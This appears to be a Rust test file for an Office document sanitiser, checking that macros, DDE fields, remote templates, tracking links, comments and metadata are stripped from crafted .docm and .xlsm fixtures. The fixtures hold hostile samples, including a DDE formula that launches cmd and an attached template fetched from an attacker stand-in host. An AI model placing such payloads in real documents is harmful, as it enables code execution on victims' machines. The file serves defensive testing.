//! Sterilisation tests: everything dangerous goes, content stays, output is
//! verified and deterministic.

use super::*;
use crate::report::{MetaKey, ThreatKind, Verdict};
use crate::tests::fixtures::*;
use crate::{FileFormat, ScanPolicy, scan_default};

fn kitchen_sink_docm() -> Vec<u8> {
    let mut o = docm_with_macro();
    let body = format!(
        "{}<w:p><w:ins w:id=\"1\" w:author=\"Мария\"><w:r><w:t>принятая вставка</w:t></w:r></w:ins><w:del w:id=\"2\" w:author=\"Олег\"><w:r><w:delText>удалённый текст</w:delText></w:r></w:del>\
         <w:commentRangeStart w:id=\"0\"/><w:r><w:t>комментируемый</w:t></w:r><w:commentRangeEnd w:id=\"0\"/><w:r><w:commentReference w:id=\"0\"/></w:r></w:p>\
         <w:p w:rsidR=\"00A1B2C3\"><w:r><w:drawing><a:blip xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" r:link=\"rId7\"/></w:drawing></w:r></w:p>\
         <w:p><w:hyperlink r:id=\"rId8\"><w:r><w:t>ссылка</w:t></w:r></w:hyperlink></w:p>{}",
        dde_body(),
        dde_quote_body()
    );
    o.set("word/document.xml", document(&body))
        .set(
            "word/_rels/document.xml.rels",
            rels(&[
                ("rId1", "settings", "settings.xml", false),
                ("rId9", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin", false),
                ("rId7", "image", "https://t.example/open.gif", true),
                ("rId8", "hyperlink", "https://phish.example/login", true),
                ("rId10", "comments", "comments.xml", false),
            ]),
        )
        .set(
            "word/comments.xml",
            format!(r#"<w:comments xmlns:w="{W_NS}"><w:comment w:id="0" w:author="Ревизор" w:initials="Р"><w:p><w:r><w:t>секрет</w:t></w:r></w:p></w:comment></w:comments>"#),
        )
        .set("word/_rels/settings.xml.rels", rels(&[("rId1", "attachedTemplate", "https://attacker.example/t.dotm", true)]))
        .set(
            "word/settings.xml",
            format!(r#"<w:settings xmlns:w="{W_NS}" xmlns:r="{R_NS}"><w:attachedTemplate r:id="rId1"/><w:docVars><w:docVar w:name="p" w:val="payload"/></w:docVars><w:rsids><w:rsidRoot w:val="00A1B2C3"/><w:rsid w:val="00A1B2C3"/></w:rsids></w:settings>"#),
        )
        .set(
            "docProps/custom.xml",
            r#"<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="2" name="Client"><vt:lpwstr>ГазНефть</vt:lpwstr></property></Properties>"#,
        )
        .set("word/printerSettings/printerSettings1.bin", "\\\\PRINTSRV01\\HP-4F".encode_utf16().flat_map(u16::to_le_bytes).chain(std::iter::repeat_n(0, 64)).collect::<Vec<u8>>())
        .set(
            "_rels/.rels",
            rels(&[
                ("rId1", "officeDocument", "word/document.xml", false),
                ("rId2", "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties", "docProps/core.xml", false),
                ("rId3", "extended-properties", "docProps/app.xml", false),
                ("rId4", "custom-properties", "docProps/custom.xml", false),
            ]),
        );
    let ct = content_types(&[
        ("/word/document.xml", CT_DOCM),
        (
            "/word/settings.xml",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml",
        ),
        ("/word/vbaProject.bin", "application/vnd.ms-office.vbaProject"),
        (
            "/word/comments.xml",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.comments+xml",
        ),
        (
            "/docProps/custom.xml",
            "application/vnd.openxmlformats-officedocument.custom-properties+xml",
        ),
        (
            "/word/printerSettings/printerSettings1.bin",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.printerSettings",
        ),
    ]);
    o.set("[Content_Types].xml", ct);
    o.build()
}

fn part(doc: &[u8], name: &str) -> Option<String> {
    let zip =
        arca_container::zip::ZipArchive::parse(doc, arca_container::zip::ZipLimits::default())
            .unwrap();
    let mut b = arca_container::InflateBudget::default();
    zip.read_by_name(name, &mut b).unwrap().map(|v| String::from_utf8(v).unwrap())
}

#[test]
fn kitchen_sink_word_document_is_sterilised() {
    let input = kitchen_sink_docm();
    let before = scan_default(&input);
    assert_eq!(before.verdict, Verdict::ActiveContentNeutralized);

    let out = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(out.format, FileFormat::Docx, "docm must become docx");
    assert_eq!(out.verification.verdict, Verdict::Clean, "{:#?}", out.verification.findings);
    for k in [
        ThreatKind::VbaMacros,
        ThreatKind::DdeField,
        ThreatKind::RemoteTemplate,
        ThreatKind::ExternalImage,
        ThreatKind::TrackedChanges,
        ThreatKind::Comments,
        ThreatKind::DocumentVariables,
        ThreatKind::PrinterMetadata,
        ThreatKind::CustomProperties,
    ] {
        assert!(!out.verification.has(k), "{k:?} survived");
    }
    for k in [
        MetaKey::Author,
        MetaKey::LastModifiedBy,
        MetaKey::Company,
        MetaKey::Manager,
        MetaKey::TotalEditMinutes,
        MetaKey::Printer,
        MetaKey::CustomProperty,
    ] {
        assert!(out.verification.meta(k).is_none(), "{k:?} survived");
    }
    assert_eq!(
        out.verification.meta(MetaKey::Title),
        Some("Квартальный отчёт"),
        "content metadata stays"
    );

    let doc = part(&out.bytes, "word/document.xml").unwrap();
    assert!(doc.contains("Обновить связи"), "field result must stay as static text");
    assert!(!doc.contains("DDEAUTO") && !doc.contains("QUOTE"));
    assert!(doc.contains("принятая вставка") && !doc.contains("удалённый текст"));
    assert!(doc.contains("комментируемый") && !doc.contains("commentReference"));
    assert!(doc.contains("ссылка") && !doc.contains("rId8") && !doc.contains("rId7"));
    assert!(!doc.contains("rsid"));
    arca_container::xml::validate_document(&doc, arca_container::xml::XmlLimits::default())
        .unwrap();

    assert!(part(&out.bytes, "word/vbaProject.bin").is_none());
    assert!(part(&out.bytes, "word/comments.xml").is_none());
    assert!(part(&out.bytes, "docProps/custom.xml").is_none());
    let ct = part(&out.bytes, "[Content_Types].xml").unwrap();
    assert!(!ct.to_ascii_lowercase().contains("macroenabled") && !ct.contains("vbaProject"));
    let settings = part(&out.bytes, "word/settings.xml").unwrap();
    assert!(
        !settings.contains("attachedTemplate")
            && !settings.contains("docVar")
            && settings.contains("w:settings")
    );

    let kinds: Vec<ActionKind> = out.actions.iter().map(|a| a.kind).collect();
    for k in [
        ActionKind::RemovedPart,
        ActionKind::RemovedExternalReference,
        ActionKind::NeutralizedField,
        ActionKind::AcceptedRevisions,
        ActionKind::RemovedComments,
        ActionKind::StrippedMetadata,
        ActionKind::ConvertedContentType,
    ] {
        assert!(kinds.contains(&k), "missing action {k:?}: {:#?}", out.actions);
    }
}

#[test]
fn excel_macros_and_formulas_are_sterilised() {
    let mut o = xlsm_with_xlm();
    o.set(
        "xl/worksheets/sheet1.xml",
        format!(r#"<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{R_NS}"><sheetData><row r="1"><c r="A1"><f>cmd|' /C calc'!A0</f><v>0</v></c><c r="B1"><f>SUM(1,2)</f><v>3</v></c></row></sheetData></worksheet>"#),
    );
    let out = sanitize(&o.build(), &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(out.format, FileFormat::Xlsx);
    assert_eq!(out.verification.verdict, Verdict::Clean, "{:#?}", out.verification.findings);
    let wb = part(&out.bytes, "xl/workbook.xml").unwrap();
    assert!(!wb.contains("Macro1") && !wb.contains("Auto_Open"));
    assert!(wb.contains("name=\"Total\""), "unrelated defined names stay");
    let sheet = part(&out.bytes, "xl/worksheets/sheet1.xml").unwrap();
    assert!(!sheet.contains("cmd|") && sheet.contains("SUM(1,2)") && sheet.contains("<v>0</v>"));
    assert!(part(&out.bytes, "xl/macrosheets/sheet1.xml").is_none());
}

#[test]
fn output_is_deterministic_and_idempotent() {
    let input = kitchen_sink_docm();
    let a = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    let b = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(a.bytes, b.bytes);
    let again = sanitize(&a.bytes, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(again.bytes, a.bytes, "sanitising a sterile file changes nothing");
}

#[test]
fn hostile_and_unsupported_inputs() {
    let mut bomb = docx();
    bomb.set("word/media/b.xml", vec![b'A'; 30 << 20]);
    assert!(matches!(
        sanitize(&bomb.build(), &ScanPolicy::default(), &SanitizeOptions::default()),
        Err(SanitizeError::Rejected(_))
    ));
    assert!(matches!(
        sanitize(&pdf_with_js(), &ScanPolicy::default(), &SanitizeOptions::default()),
        Err(SanitizeError::Unsupported(FileFormat::Pdf))
    ));
    assert!(matches!(
        sanitize(&doc_binary(), &ScanPolicy::default(), &SanitizeOptions::default()),
        Err(SanitizeError::Unsupported(FileFormat::Doc))
    ));
}

#[test]
fn sanitized_document_survives_the_wire() {
    let out =
        sanitize(&docm_with_macro().build(), &ScanPolicy::default(), &SanitizeOptions::default())
            .unwrap();
    let bytes = arca_abi::wire::to_bytes(&out).unwrap();
    let back: SanitizedDocument =
        arca_abi::wire::from_bytes(&bytes, arca_abi::wire::DecodeLimits::default()).unwrap();
    assert_eq!(back, out);
}

/// Writes kitchen-sink inputs and their sterile copies to `$ARCA_DUMP_DIR`.
#[test]
fn dump_sanitized_for_external_validation() {
    let Some(dir) = std::env::var_os("ARCA_DUMP_DIR") else { return };
    let dir = std::path::PathBuf::from(dir);
    std::fs::create_dir_all(&dir).unwrap();
    let input = kitchen_sink_docm();
    std::fs::write(dir.join("kitchen_sink.docm"), &input).unwrap();
    let out = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    std::fs::write(dir.join("kitchen_sink.sanitized.docx"), &out.bytes).unwrap();
    let xl =
        sanitize(&xlsm_with_xlm().build(), &ScanPolicy::default(), &SanitizeOptions::default())
            .unwrap();
    std::fs::write(dir.join("xlm.sanitized.xlsx"), &xl.bytes).unwrap();
}
